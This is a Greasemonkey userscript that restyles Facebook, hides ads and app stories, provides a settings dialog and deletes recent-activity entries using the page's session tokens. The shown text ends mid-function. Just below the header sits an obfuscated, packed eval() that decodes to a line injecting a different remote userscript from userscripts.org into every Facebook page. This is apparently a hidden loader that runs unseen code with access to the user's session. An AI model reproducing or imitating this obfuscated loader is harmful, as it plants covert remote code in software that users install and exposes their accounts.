// ==UserScript==
// @name          UnFuck Facebook Plus + Last Update
// @namespace     sizzlemctwizzle
// @description	  Fixed recent activity removal again.
// @version       2.8.1.1
// @require       http://sizzlemctwizzle.com/updater.php?id=11992
// @include       http://*.facebook.com/*
// @include       https://*.facebook.com/*
// @include		   http://www.facebook.com/*
// @include		   https://www.facebook.com/*
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))


// Start of Graphical Settings code == http://github.com/sizzlemctwizzle/GM_config/raw/master/gm_config.js
// The GM_config constructor
function GM_configStruct() {
  // call init() if settings were passed to constructor
  if (arguments.length)
    GM_configInit(this, arguments);
}

// This is the initializer function
function GM_configInit(config, args) {
  var settings = null;
  
  // If the id has changed we must modify the default style
  if (config.id != 'GM_config')
    config.css.basic = config.css.basic.replace(/#GM_config/gm, '#' + config.id);

  // loop through GM_config.init() arguments
  for (var i = 0, l = args.length, arg; i < l; ++i) {
    arg = args[i];

    // An element to use as the config window
    if (typeof arg.appendChild == "function") {
      config.frame = arg;
      continue;
    }

    switch (typeof arg) {
      case 'object':
        for (var j in arg) { // could be a callback functions or settings object
          if (typeof arg[j] != "function") { // we are in the settings object
            settings = arg; // store settings object
            break; // leave the loop
          } // otherwise it must be a callback function
          config["on" + j.charAt(0).toUpperCase() + j.slice(1)] = arg[j];
        }
        break;
      case 'function': // passing a bare function is set to open callback
        config.onOpen = arg;
        break;
      case 'string': // could be custom CSS or the title string
        if (arg.indexOf('{') != -1 && arg.indexOf('}') != -1) 
          config.css.stylish = arg;
        else 
          config.title = arg;
        break;
    }
  }

  if (settings) {
    var stored = config.read(); // read the stored settings

    for (var id in settings) // for each setting create a field object
      config.fields[id] = new GM_configField(settings[id], stored[id], id);
  }
}

GM_configStruct.prototype = {
  // Support old method of initalizing
  init: function() { GM_configInit(this, arguments); },

  // call GM_config.open() from your script to open the menu
  open: function () {
    // Die if the menu is already open on this page
    // You can have multiple instances but they can't be open at the same time
    var match = document.getElementById(this.id);
    if (match && (match.tagName == "IFRAME" || match.childNodes.length > 0)) return;

    // Sometime "this" gets overwritten so create an alias
    var config = this;

    // Function to build the mighty config window :)
    function buildConfigWin (body, head) {
      var frameBody = body,
          create = config.create,
          fields = config.fields,
          configId = config.id;

      // Append the style which is our default style plus the user style
      head.appendChild(
        create('style', {
        type: 'text/css',
        textContent: config.css.basic + config.css.stylish
      }));

      // Add header and title
      frameBody.appendChild(create('div', {
        id: configId + '_header',
        className: 'config_header block center',
        textContent: config.title
      }));

      // Append elements
      var section = frameBody,
          secNum = 0; // Section count

      // loop through fields
      for (var id in fields) {
        var field = fields[id].settings;

        if (field.section) { // the start of a new section
          section = frameBody.appendChild(create('div', {
              className: 'section_header_holder',
              id: configId + '_section_' + secNum
            }));

          if (typeof field.section[0] == "string")
            section.appendChild(create('div', {
              className: 'section_header center',
              id: configId + '_section_header_' + secNum,
              innerHTML: field.section[0]
            }));

          if (typeof field.section[1] == "string") 
            section.appendChild(create('p', {
              className: 'section_desc center',
              id: configId + '_section_desc_' + secNum,
              innerHTML: field.section[1]
            }));
          ++secNum;
        }

        // Create field elements and append to current section
        section.appendChild(fields[id].toNode(configId));
      }

      // Add save and close buttons
      frameBody.appendChild(create('div',
        {id: configId + '_buttons_holder'},

        create('button', {
          id: configId + '_saveBtn',
          textContent: 'Save',
          title: 'Save settings',
          className: 'saveclose_buttons',
          onclick: function () { config.save() }
        }),

        create('button', {
          id: configId + '_closeBtn',
          textContent: 'Close',
          title: 'Close window',
          className: 'saveclose_buttons',
          onclick: function () { config.close() }
        }),

        create('div', 
          {className: 'reset_holder block'},

          // Reset link
          create('a', {
            id: configId + '_resetLink',
            textContent: 'Reset to defaults',
            href: '#',
            title: 'Reset fields to default values',
            className: 'reset',
            onclick: function(e) { e.preventDefault(); config.reset() }
          })
      )));

      config.center(); // Show and center iframe
      window.addEventListener('resize', config.center, false); // Center frame on resize

      if (config.onOpen) 
        config.onOpen(config.frame.contentDocument || config.frame.ownerDocument,
                      config.frame.contentWindow || window, 
                      config.frame); // Call the open() callback function

      // Close frame on window close
      window.addEventListener('beforeunload', function () {
          config.close();
      }, false);

      // Now that everything is loaded, make it visible
      config.frame.style.display = "block";
    }

    // Either use the element passed to init() or create an iframe
    var defaultStyle = 'position:fixed; top:0; left:0; opacity:0; display:none; z-index:999;' +
                       'width:75%; height:75%; max-height:95%; max-width:95%;' +
                       'border:1px solid #000000; overflow:auto; bottom: auto;' +
                       'right: auto; margin: 0; padding: 0;';
    if (this.frame) {
      this.frame.id = this.id;
      this.frame.setAttribute('style', defaultStyle);
      buildConfigWin(this.frame, this.frame.ownerDocument.getElementsByTagName('head')[0]);
    } else {
      // Create frame
      document.body.appendChild((this.frame = this.create('iframe', {
        id: this.id,
        style: defaultStyle
      })));

      this.frame.src = 'about:blank'; // In WebKit src can't be set until it is added to the page
      // we wait for the iframe to load before we can modify it
      this.frame.addEventListener('load', function(e) {
          var frame = config.frame;
          var body = frame.contentDocument.getElementsByTagName('body')[0];
          body.id = config.id; // Allows for prefixing styles with "#GM_config"
          buildConfigWin(body, frame.contentDocument.getElementsByTagName('head')[0]);
      }, false);
    }
  },

  save: function () {
    var fields = this.fields;
    for (id in fields) {
      var field = fields[id],
          val = field.toValue();

      if (val === null) { // invalid value encountered
        this.readVals = {};
        return;
      } else if (field.settings.type != "button")
        this.readVals[id] = val;
    }

    this.write();

    if (this.onSave) 
      this.onSave(); // Call the save() callback function
  },

  close: function() {
    // If frame is an iframe then remove it
    if (this.frame.contentDocument) {
      this.remove(this.frame);
      this.frame = null;
    } else { // else wipe its content
      this.frame.innerHTML = "";
      this.frame.style.display = "none";
    }

    // Null out all the fields so we don't leak memory
    var fields = this.fields;
    for (id in fields)
      fields[id].node = null;

    if (this.onClose) 
      this.onClose(); //  Call the close() callback function
  },

  set: function (name, val) {
    this.fields[name].value = val;
  },

  get: function (name) {
    return this.fields[name].value;
  },

  write: function (store, obj) {
    try {
      this.setValue(store || this.id, this.stringify(obj || this.readVals));
    } catch(e) {
      this.log("GM_config failed to save settings!");
    }
    this.readVals = {};
  },

  read: function (store) {
    try {
      var rval = this.parser(this.getValue(store || this.id, '{}'));
    } catch(e) {
      this.log("GM_config failed to read saved settings!");
      var rval = {};
    }
    return rval;
  },

  reset: function () {
    var fields = this.fields,
        doc = this.frame.contentDocument || this.frame.ownerDocument,
        type;

    for (id in fields) {
      var node = fields[id].node,
          field = fields[id].settings,
          noDefault = typeof field['default'] == "undefined",
          type = field.type;

      switch (type) {
        case 'checkbox':
          node.checked = noDefault ? GM_configDefaultValue(type) : field['default'];
          break;
        case 'select':
          if (field['default']) {
            for (var i = 0, len = node.options.length; i < len; ++i)
              if (node.options[i].value == field['default']) 
                node.selectedIndex = i;
          } else 
            node.selectedIndex = 0;
          break;
        case 'radio':
          var radios = node.getElementsByTagName('input'); 
          for (var i = 0, len = radios.length; i < len; ++i) 
            if (radios[i].value == field['default']) 
              radios[i].checked = true;
          break;
        case 'button' :
          break;
        default:
          node.value = noDefault ? GM_configDefaultValue(type) : field['default'];
          break;
      }
    }
  },

  create: function () {
    switch(arguments.length) {
      case 1:
        var A = document.createTextNode(arguments[0]);
        break;
      default:
        var A = document.createElement(arguments[0]),
            B = arguments[1];
        for (var b in B) {
          if (b.indexOf("on") == 0)
            A.addEventListener(b.substring(2), B[b], false);
          else if (",style,accesskey,id,name,src,href,which".indexOf("," +
                   b.toLowerCase()) != -1)
            A.setAttribute(b, B[b]);
          else
            A[b] = B[b];
        }
        for (var i = 2, len = arguments.length; i < len; ++i)
          A.appendChild(arguments[i]);
    }
    return A;
  },

  center: function () {
    var node = this.frame,
        style = node.style,
        beforeOpacity = style.opacity;
    if (style.display == 'none') style.opacity = '0';
    style.display = '';
    style.top = Math.floor((window.innerHeight / 2) - (node.offsetHeight / 2)) + 'px';
    style.left = Math.floor((window.innerWidth / 2) - (node.offsetWidth / 2)) + 'px';
    style.opacity = '1';
  },

  remove: function (el) {
    if (el && el.parentNode) el.parentNode.removeChild(el);
  },

  // Define some default properties
  onOpen: null,
  onSave: null,
  onClose: null,
  id: 'GM_config',
  fields: {},
  readVals: {},
  title: 'User Script Settings',
  css: {
    basic:     "#GM_config * { font-family: arial,tahoma,myriad pro,sans-serif; }"
      + '\n' + "#GM_config { background: #FFF; }"
      + '\n' + "#GM_config input[type='radio'] { margin-right: 8px; }"
      + '\n' + "#GM_config .indent40 { margin-left: 40%; }"
      + '\n' + "#GM_config .field_label { font-weight: bold; font-size: 12px; margin-right: 6px; }"
      + '\n' + "#GM_config .block { display: block; }"
      + '\n' + "#GM_config .saveclose_buttons { margin: 16px 10px 10px; padding: 2px 12px; }"
      + '\n' + "#GM_config .reset, #GM_config .reset a,"
      + '\n' + "#GM_config_buttons_holder { text-align: right; color: #000; }"
      + '\n' + "#GM_config .config_header { font-size: 20pt; margin: 0; }"
      + '\n' + "#GM_config .config_desc, #GM_config .section_desc, #GM_config .reset { font-size: 9pt; }"
      + '\n' + "#GM_config .center { text-align: center; }"
      + '\n' + "#GM_config .section_header_holder { margin-top: 8px; }"
      + '\n' + "#GM_config .config_var { margin: 0 0 4px; }"
      + '\n' + "#GM_config .section_header { font-size: 13pt; background: #414141; color: #FFF;" 
      + '\n' +  "border: 1px solid #000; margin: 0; }"
      + '\n' + "#GM_config .section_desc { font-size: 9pt; background: #EFEFEF; color: #575757;"
      + '\n' + "border: 1px solid #CCC; margin: 0 0 6px; }",
    stylish: ""
  }
};

// Define a bunch of API stuff
(function() {
  var isGM = typeof GM_getValue != 'undefined' && 
             typeof GM_getValue('a', 'b') != 'undefined',
      setValue, getValue, stringify, parser;

  // Define value storing and reading API
  if (!isGM) {
    setValue = function (name, value) {
      return localStorage.setItem(name, value);
    };
    getValue = function(name, def){
      var s = localStorage.getItem(name); 
      return s == null ? def : s
    };

    // We only support JSON parser outside GM
    stringify = JSON.stringify;
    parser = JSON.parse;
  } else {
    setValue = GM_setValue;
    getValue = GM_getValue;
    stringify = typeof JSON == "undefined" ? 
      function(obj) { 
        return obj.toSource();
    } : JSON.stringify;
    parser = typeof JSON == "undefined" ? 
      function(jsonData) {
        return (new Function('return ' + jsonData + ';'))(); 
    } : JSON.parse;
  }

  GM_configStruct.prototype.isGM = isGM;
  GM_configStruct.prototype.setValue = setValue;
  GM_configStruct.prototype.getValue = getValue;
  GM_configStruct.prototype.stringify = stringify;
  GM_configStruct.prototype.parser = parser;
  GM_configStruct.prototype.log = isGM ? GM_log : (window.opera ? opera.postError : console.log);
})();

function GM_configDefaultValue(type) {
  var value;

  if (type.indexOf('unsigned ') == 0)
    type = type.substring(9);

  switch (type) {
    case 'radio': case 'select':
      value = settings.options[0];
      break;
    case 'checkbox':
      value = false;
      break;
    case 'int': case 'integer':
    case 'float': case 'number':
      value = 0;
      break;
    default:
      value = '';
  }

  return value;
}

function GM_configField(settings, stored, id) {
  // Store the field's settings
  this.settings = settings;
  this.id = id;
  
  // if a setting was passed to init but wasn't stored then 
  //      if a default value wasn't passed through init() then 
  //      use default value for type
  //      else use the default value passed through init()
  // else use the stored value
  var value = typeof stored == "undefined" ? 
                typeof settings['default'] == "undefined" ? 
                  GM_configDefaultValue(settings.type)
                : settings['default'] 
              : stored;

  // Store the field's value
  this.value = value;
}

GM_configField.prototype = {
  create: GM_configStruct.prototype.create,

  node: null,

  toNode: function(configId) {
    var field = this.settings,
        value = this.value,
        options = field.options,
        id = this.id,
        create = this.create;

    var retNode = create('div', { className: 'config_var', 
          id: configId + '_' + this.id + '_var',
          title: field.title || '' });

    if (field.type != "hidden" &&
        field.type != "button" &&
        typeof field.label == "string")
      retNode.appendChild(create('span', {
        textContent: field.label,
        id: configId + '_' + this.id +'_field_label',
        className: 'field_label'
      }));

    switch (field.type) {
      case 'textarea':
        retNode.appendChild((this.node = create('textarea', {
          id: configId + '_field_' + this.id,
          innerHTML: value,
          cols: (field.cols ? field.cols : 20),
          rows: (field.rows ? field.rows : 2)
        })));
        break;
      case 'radio':
        var wrap = create('div', {
          id: configId + '_field_' + id
        });
        this.node = wrap;

        for (var i = 0, len = options.length; i < len; ++i) {
          wrap.appendChild(create('span', {
            textContent: options[i]
          }));

          wrap.appendChild(create('input', {
            value: options[i],
            type: 'radio',
            name: id,
            checked: options[i] == value ? true : false
          }));
        }

        retNode.appendChild(wrap);
        break;
      case 'select':
        var wrap = create('select', {
          id: configId + '_field_' + id
        });
        this.node = wrap;

        for (var i in options)
          wrap.appendChild(create('option', {
            textContent: options[i],
            value: i,
            selected: options[i] == value ? true : false
          }));

        retNode.appendChild(wrap);
        break;
      case 'checkbox':
        retNode.appendChild((this.node = create('input', {
          id: configId + '_field_' + id,
          type: 'checkbox',
          value: value,
          checked: value
        })));
        break;
      case 'button':
        var btn = create('input', {
          id: configId + '_field_' + id,
          type: 'button',
          value: field.label,
          size: (field.size ? field.size : 25),
          title: field.title || ''
        });
        this.node = btn;

        if (field.script)
          btn.addEventListener('click', function () {
            var scr = field.script;
            typeof scr == 'function' ? setTimeout(scr, 0) : eval(scr);
          }, false);

        retNode.appendChild(btn);
        break;
      case 'hidden':
        retNode.appendChild((this.node = create('input', {
          id: configId + '_field_' + id,
          type: 'hidden',
          value: value
        })));
        break;
      default:
        // type = text, int, or float
        retNode.appendChild((this.node = create('input', {
          id: configId + '_field_' + id,
          type: 'text',
          value: value,
          size: (field.size ? field.size : 25)
        })));    
    }

    return retNode;
  },

  toValue: function() {
    var node = this.node,
        field = this.settings,
        type = field.type,
        unsigned = false,
        rval;

    if (type.indexOf('unsigned ') == 0) {
      type = type.substring(9);
      unsigned = true;
    }

    switch (type) {
      case 'checkbox':
        this.value = node.checked;
        break;
      case 'select':
        this.value = node[node.selectedIndex].value;
        break;
      case 'radio':
        var radios = node.getElementsByTagName('input');
        for (var i = 0, len = radios.length; i < len; ++i) 
          if (radios[i].checked)
            this.value = radios[i].value;
        break;
      case 'button':
        break;
      case 'int': case 'integer':
        var num = Number(node.value);
        if (isNaN(num) || Math.ceil(num) != Math.floor(num) || 
            (unsigned && num < 0)) {
          alert('Field labeled "' + field.label + '" expects a ' + 
                (unsigned ? 'positive ' : '') + 'integer value.');
          return null;
        }
        this.value = num;
        break;
      case 'float': case 'number':
        var num = Number(node.value);
        if (isNaN(num) || (unsigned && num < 0)) {
          alert('Field labeled "' + field.label + '" expects a ' + 
                (unsigned ? 'positive ' : '') + 'number value.');
          return null;
        }
        this.value = num;
        break;
      default:
        this.value = node.value;
        break;
    }

    return this.value; // value read successfully
  }
};
// End of Graphical Settings code

// UnFuck Facebook Settings
var GM_config = new GM_configStruct('UnFuck Facebook', {
    appReq: {
        section: ['Invite Blocking', 'Check the types of invites you want to block automatically'],
        label: 'Application',
        type: 'checkbox',
        title: 'Still broke at the moment :(',
        'default': false
    },
    fanReq: {
        label: 'Fan Page',
        type: 'checkbox',
        'default': false
    },
    groupReq: {
        label: 'Group',
        type: 'checkbox',
        'default': false
    },
    eventReq: {
        label: 'Event',
        type: 'checkbox',
        'default': false
    },
    appHide: {
        section: ['Home Settings', 'Control what appears in your stream'],
        label: 'Hide App Stories',
        type: 'checkbox',
        'default': true
    },
    fanHide: {
        label: 'Hide Fan Stories',
        type: 'checkbox',
        'default': false
    },
    appBlock: {
        label: 'Block App Stories',
        title: 'Prevent apps from showing up in your stream in the future',
        type: 'checkbox',
        'default': false
    },
    wallStory: {
        label: 'Hide Wall Stories',
        title: 'Hide the one-sided wall conversations',
        type: 'checkbox',
        'default': true
    },
    addFriend: {
        label: 'Hide New Friend Stories',
        title: 'Hide the "Someone is now friends with someone." stories',
        type: 'checkbox',
        'default': false
    },
    showStat: {
        label: 'Show status on home page',
        type: 'checkbox',
        'default': true
    },
    statOnly: {
        label: 'Default to status-only Home Feed',
        type: 'checkbox',
        'default': false
    },
    columns: {
        label: 'Number of Columns',
        title: 'Make the home page one to three columns',
        type: 'radio',
        options: ['One', 'Two', 'Three'],
        'default': 'Two'
    },
    noStuff: {
        label: 'Show right column above feed in one column mode',
        title: 'This option does nothing in two or three column mode',
        type: 'checkbox',
        'default': true
    },
    suggest: {
        label: 'Hide suggestions',
        type: 'checkbox',
        'default': true
    },
    chatSide: {
        label: 'Show Chat Sidebar',
        type: 'checkbox',
        'default': false
    },
    profBoxes: {
        section: ['Profile Settings', 'Control what appears on profiles'],
        label: 'Hide Application Boxes',
        type: 'checkbox',
        'default': true
    },
    appTabs: {
        label: 'Hide Application Tabs',
        type: 'checkbox',
        'default': false
    },
    wideCom: {
        section: ['General Settings'],
        label: 'Wide Comments',
        type: 'checkbox',
        'default': true
    },
    homeLink: {
        label: 'Show Home link in Nav Bar',
        type: 'checkbox',
        'default': true
    },
    recentHide: {
        section: ['Advance Feature'],
        label: 'Automatically remove "Recent Activity" Stories from your profile',
        type: 'checkbox',
        title: 'Remove those one-liner stories Facebook publishes automatically everytime you do anything',
        'default': false
    }
},
'#GM_config .config_header { color: #3B5998 !important; } #GM_config .section_header { background-color: #3B5998 !important; } #GM_config .section_desc { color: #999999 !important; } #GM_config .field_label, #GM_config .config_var span { color: #3E5A88 !important; font-size: 12px !important; } #GM_config_header a { color: #3B5998 !important; font-size: 12px !important; display: block !important; } #GM_config_section_0 .config_var, #GM_config_section_0 .section_desc { display: none !important; } #GM_config_section_header_0 { text-decoration: line-through !important; }',
{
    open: function(doc) {
        var id = doc.getElementById,
            disableOpt = function(op) {
                var el = id('GM_config_field_'+op);
                el.checked = false;
                el.disabled = true;
                el.parentNode.title = "This shit is broke right now :("
                el.parentNode.firstChild.setAttribute('style', 'text-decoration: line-through;');
            };
        disableOpt('appReq');
        disableOpt('fanReq');
        disableOpt('groupReq');
        disableOpt('eventReq');
        disableOpt('addFriend');
        disableOpt('statOnly');
        id('GM_config_header').appendChild(create('a',{href:'http://userscripts.org/scripts/show/11992',target:'_blank', textContent:'Script Home Page'}));
   },
   save: function() {
        GM_config.close();
        window.location.reload(); 
   }
});

// I've mananged to do a lot of my script in CSS
var unfuckStyle='#right_column { width: 77% !important; } '+(GM_config.get('profBoxes')?'div[id^="box_app_"]:not(#box_app_2297529396):not(#box_app_2305272732):not(#box_app_2309869772):not(#box_app_2327158227):not(#box_app_2341989679):not(#box_app_2347471856):not(#box_app_2356318349):not(#box_app_2361831622):not(#box_app_2407511955):not(#box_app_2503140832):not(#box_app_2719290516):not(#box_app_2392950137):not(#box_app_2550392059), ':'')+'.gifts_received, .wall_contextual_extra, .nextstep, .app_icon_row, .invitefriends, #ssponsor, div[class$="_ad"], .divider_bar, .more_section, .fbpage_fan, .ad_capsule, .see_more_arrow, #more_apps_divider_narrow, .platform, .profile_empty_divider, .newstuff, .app_install_story, .emu_sponsor, div[id^="emu_"], .adcolumn, .social_ad, .sponsor, #attachment_buttons_list span[style*="app_"], li[id^="bookmarked_app_"] a[href^="http://apps."], li[id^="bookmarked_app_"] a[href*="gift"], #profile_tab_add, .footer_ad, .UIComposer_More_Container, .UIComposer_Attachment a[style*="gift.gif"], '+(GM_config.get('appTabs')?'li[view="box_3"], li[view^="app_"], li[view="app_2347471856"], li[view="app_2392950137"], ':'')+'.approve_friend, .app_story, .UIComposer_Attachment a[style*="/app_"], .UIRoundedImage_CornersSprite, #home_sponsor, .hp_connect_box, .UIUpcoming_Info small, .house_sponsor, #home_sponsor_nile, .UIStandardFrame_SidebarAds, div[style*="white"], '+(GM_config.get('suggest') ? '#pagelet_netego, ':'')+'#unfucked, #ego'+(GM_config.get('recentHide') && false ? ', .UIRecentActivity_Stream' : '')+' { display: none !important; }\n' +
(GM_config.get('columns') != "Three" ? '.UITitledBox_Content { padding: 3px !important; }\n'+
'#contentArea { width: 90% !important; }\n' +
 '#rightCol { '+ (GM_config.get('columns') == "Two" || !GM_config.get('noStuff') ? 'display: none !important; width: 0% !important': 'float: left !important; margin-left: 3% !important; width: 40% !important') +' }\n' +
'#headNavOut { width: '+(GM_config.get('columns') == "Two" ? '77.5%' : '55%' )+' !important; float: right !important; }\n'+
'.fbx #globalContainer { width:auto; margin:auto 1.5%; }\n' +
'#leftCol { width: 20.8% !important; border-right: none !important;}\n'  +
(GM_config.get('columns') == "One" ? '#contentCol { margin-left: 0% !important; } ' :'#headNavOut, #contentCol { margin-left:21% !important; }\n') +
'.uiSideNav, .uiSideNav li { width: 100% !important; }\n' +
'#contentCurve, #footerContainer { width:auto !important; margin:auto !important; margin-left:5% !important; border: none !important; }\n' +
'#q { display:block !important;}' +
'#navSearch { width: 40% !important; }':'') +
(GM_config.get('columns') == "One" ? '#leftCol { width: 0% !important; display: none !important; padding: 0% !important }\n' +
'#contentCol, #contentArea, #headNavOut { margin-left 0px !imporatant; padding-left 0px !important; float: left !important; }':'') +
(GM_config.get('homeLink') ? '' : '#pageNav li a[href$="?ref=home"] { display: none !important;}') +
(GM_config.get('wideCom') ? '.UIWashFrame_SidebarAds { display: none !important; }\n' +
'.UIWashFrame_Content { width: 99% !important; }\n' +
'.UIStandardFrame_Content { width: 99% !important; }\n' +
'#wall { width: 80% !important; }\n' +
'.uiUfiAddComment .actorPic { display: none !important; }\n' +
'.notes_side_column { margin:0% !important; padding:0% !important; }' +
'#photocomment { width: 80% !important; }' +
'.album .footer .info, .note_footer { width: 100% !important; }\n' +
'.one_row_add_box textarea.DOMControl_placeholder { width: 90% !important; }\n' +
'.comments_add_box textarea, .comment_box, .uiTextareaAutogrow, .uiList, .ufi_section, .comment_text, .ie6 .commentable_item textarea.DOMControl_placeholder, .no_js .commentable_item .comment_box .comments_add_box textarea { width: 98% !important; }\n' +
'.request_link { padding-left: 5% !important; }': '');

// GM_addStyle if not available
if(typeof GM_addStyle == 'undefined') 
    GM_addStyle = function(css) {
        var head = document.getElementsByTagName('head')[0], 
        style = document.createElement('style');
        if (!head) {return}
        style.type = 'text/css';
        style.textContent = css;
        head.appendChild(style);
    }

// Inject a script into the page
function addScript(js) {
    var body = document.body, script = document.createElement('script');
    if (!body) {return}
    script.type = 'text/javascript';
    try {script.innerHTML = js}
    catch(x) {script.innerText = js}
    body.appendChild(script);
}

function $x(x, t, r) {
    if (t && t.nodeType) 
        var h = r, r = t, t = h;    
    var d = r ? r.ownerDocument || r : r = document, p;
    switch (t) {
    case 1:
        p = 'numberValue';
        break;
    case 2:
        p = 'stringValue';
        break;
    case 3:
        p = 'booleanValue';
        break;
    case 8: case 9:
        p = 'singleNodeValue';
        break;
    default:
        return d.evaluate(x, r, null, t || 6, null);
    }
    return d.evaluate(x, r, null, t, null)[p];
}

// Optional shortcut functions I like
function $x1(x, r) { return $x(x, 9, r) } 
function $xb(x, r) { return $x(x, 3, r) }
    
// A robust and universal forEach
function forEach(lst, cb) {
    if(!lst) 
        return;
    if (lst.snapshotItem)
        for (var i = 0, len = lst.snapshotLength; i < len; ++i)
            cb(lst.snapshotItem(i), i, lst);
    else if (lst.iterateNext) {
        var item, next = lst.iterateNext;
        while (item = next()) 
            cb(item, lst);
    } else if (typeof lst.length !== 'undefined') 
        for (var i = 0, len = lst.length; i < len; ++i)
            cb(lst[i], i, lst);
    else if (typeof lst === "object")
        for (var i in lst) 
            cb(lst[i], i, lst);
}

// Insert an element after another
function insertAfter(node, after) { after.parentNode.insertBefore(node, after.nextSibling) }

// A really cool element creation funtion by avg and JoeSimmons, and modified by me
function create() {
    switch(arguments.length) {
        case 1:
            var A = document.createTextNode(arguments[0]);
	    break;
        default:
            var A = document.createElement(arguments[0]),
                B = arguments[1];
            for (var b in B) {
	        if (b.indexOf("on") == 0)
		    A.addEventListener(b.substring(2), B[b], false);
		else if (",style,accesskey,id,name,src,href,which".indexOf("," +
                         b.toLowerCase()) != -1)
		    A.setAttribute(b, B[b]);
		else
		    A[b] = B[b];
            }
            for(var i = 2, len = arguments.length; i < len; ++i)
	        A.appendChild(arguments[i]);
    }
    return A;
}

// Remove an element
function destroy(element) { element.parentNode.removeChild(element); }
// Get element by id
function $(element) { return document.getElementById(element); }
// Get element by class name
function $c(element, root) { return (root||document).getElementsByClassName(element); }
// Destroy elements that are retrieved with xpath
function seekAndDestroy(xpath, root) {
  forEach($x(xpath, root), destroy);
}
// Add a new class to an element
function addClass(el,cls) {
    if (!el.className.match(new RegExp('(\\s|^)'+cls+'(\\s|$)'))) 
        el.className += " "+cls;
}
// Remove a particular class from an element
function removeClass(el,cls) {
    if (el.className.match(new RegExp('(\\s|^)'+cls+'(\\s|$)'))) {
        var reg = new RegExp('(\\s|^)'+cls+'(\\s|$)');
        el.className = el.className.replace(reg,' ');
    }
}

// Get the actual Facebook url
function realUrl() {
    return /^#!\/.*/.test(window.location.hash) ? 
           'http://'+window.location.host+window.location.hash.split('#!')[1] : 
           window.location.href;
}

// Same domain
function xhr(url, cb, data) {
  var res =  new XMLHttpRequest();
  res.onreadystatechange = function() { if (res.readyState==4 && res.status==200) cb(res.responseText) };
  res.open(data ? 'POST' : 'GET', url, true);
  res.setRequestHeader('User-agent', window.navigator.userAgent);
  if (data) {
    res.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
    res.setRequestHeader("Connection", "close");
    res.setRequestHeader("Content-length", data.length);
  }
  res.send(data||null);
}

// Cross domain
function xXhr(url, cb, data) {
    GM_xmlhttpRequest({
          method: data ? 'POST' : 'GET',
	  url: url,
	  headers: {
	    'User-agent': window.navigator.userAgent,
	    'Accept': (data) ? 'application/x-www-form-urlencoded' : 'application/atom+xml,application/xml,text/xml',
            'Content-type': (data) ? 'application/x-www-form-urlencoded' : null
	  },
	  data: (data) ? data : null,
	  onload: function(res) { if (res.status == 200 && cb) cb(res.responseText); }
      });
}

function createDoc(html) {
  var dt = document.implementation.createDocumentType("html", 
          "-//W3C//DTD HTML 4.01 Transitional//EN", "http://www.w3.org/TR/html4/loose.dtd"),
      doc = document.implementation.createDocument('', '', dt),
      html = doc.createElement('html');

  html.innerHTML = html;
  doc.appendChild(html);
  return doc;
}

function displayStatus(status, time) {
  var nameLink = $c('fbxWelcomeBoxName')[0];
  nameLink.setAttribute('style', 'display:inline; font-size: 11.5px;');
  destroy($c('fbxWelcomeBoxProfileLink')[0]);
  nameLink.parentNode.appendChild(create('div', {id:'UIHome_Status', style: 'padding-bottom: 5px; display:inline;'},
                        nameLink,
                        create('span',{innerHTML:'&nbsp;'}),
                        create('span',{style:'font-weight: normal; font-size: 11.5px;',innerHTML:status}),
                        create('br',{}),
                        create('span',{style:'color: #BBBBBB; font-size: 10px;',textContent:time}),
                        create('span',{innerHTML:'&nbsp;'}),
                        create('a',{href:'#',style:'font-size: 10px;',textContent:'clear',onclick:function (e) { fbAjax('http://www.facebook.com/ajax/updatestatus.php', 'clear=1&profile_id='+unsafeWindow.Env.user);GM_addStyle('#UIHome_Status { display: none !important; } .fbxWelcomeBoxName { display: block !important; }');e.preventDefault()}})
                     ));
  GM_addStyle('#UIHome_Status { display: block !important; }');
}

function getStatus() {
  if ($('navAccountName')) {
    if (typeof GM_xmlhttpRequest !== 'undefined')
      xXhr('http://m.facebook.com/profile.php', function(text) {
        if (stat=text.match(/<div id="anchor_fbid_.+?">(.+?)&nbsp;<small>\(<abbr [^>]+>(.+?)<\/abbr>\)<\/small>/i))
          displayStatus(stat[1], stat[2]);
      });
    else
      xhr($('navAccountName').href, function(text) {
          if ((stat=text.match(/<span id=\\"status_text\\">(.+?)<\\\/span>/i))&&(time=text.match(/<span id=\\"status_time_inner\\"><abbr [^>]+>(.+?)<\\\/abbr>/i))&&(stat[1]!=' '))
            displayStatus(stat[1], time[1]);
        });
  }
}

// Simulate Facebook's Ajax calls
function fbAjax(url, params) {
  xhr(url, function() {}, params + "&post_form_id=" + unsafeWindow.Env["post_form_id"] + 
      "&__a=1&post_form_id_source=AsyncRequest&fb_dtsg=" + unsafeWindow.Env["fb_dtsg"] + 
      "&nctr[nid]=" + unsafeWindow.Env["nctrlid"] + '&nctr[ct]=' + unsafeWindow.Env["start"]);
}

function statOnly() {
  var that = $('status_only_filter'),
      nf=$('navItem_nf');
  nf.className = nf.className.replace('selected', '');
  if (!that.parentNode.className.match('selected')) {
    that.parentNode.className += ' selected';
    seekAndDestroy('//i[contains(@class, "spritemap_icons") and not(contains(@class, "sx_icons_like_on")) and not(contains(@class, "sx_icons_mobile_app"))]/ancestor::li[starts-with(@id, "stream_story_")]', $('home_stream'));
  }
}

function changeRecent(type, checked) {
  var settings = GM_config.read('recentSettings');
  settings[type] = checked;
  GM_config.save('recentSettings', settings);
}

function removeActivity(doc, remove) {
  var settings = GM_config.read('recentSettings');
  forEach($x('.//div[contains(concat(" ", @class, " "), "UIRecentActivity_Content")]//a[@rel="async-post"]', doc), 
          function(recent) {
            var url = recent.getAttribute('href');
            if (url == "#") url = recent.getAttribute('ajaxify');
            var story_type = url.match(/story_type=(\d+)/i)[1],
                story_key = url.match(/story_key=(\d+)/i)[1];
            if ((typeof settings[story_type] == "boolean" ? !settings[story_type] : GM_config.get('recentHide'))) {
              fbAjax("http://www.facebook.com/ajax/minifeed.php?__a=1", "profile_fbid="+unsafeWindow.Env.user+"&ministory_key="+story_key+"&story_type="+story_type+"&revoke_permission=");
              if (remove)
                destroy(recent.parentNode.parentNode.parentNode);
            }
  });
}

function recentActivityProcess(forced) {
  // Remove those stories from your profile that Facebook publishes anytime you do anything
  // You use to be able to turn them off but now Faceboook makes you delete them one by one
